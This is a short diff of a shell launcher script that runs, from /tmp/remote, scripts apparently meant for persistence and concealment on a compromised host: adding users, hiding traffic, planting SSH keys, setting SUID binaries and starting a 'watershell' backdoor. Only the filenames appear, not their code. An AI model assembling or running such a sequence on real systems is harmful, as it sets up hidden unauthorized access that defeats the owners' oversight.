@@ -2,7 +2,7 @@
 
 cd /tmp/remote
 /tmp/remote/adduser.sh
-/tmp/remote/hidetraffic
+/tmp/remote/hidetraffic.sh
 /tmp/remote/sshKeys.sh
 /tmp/remote/rude_suid.sh
 /tmp/remote/watershell.sh
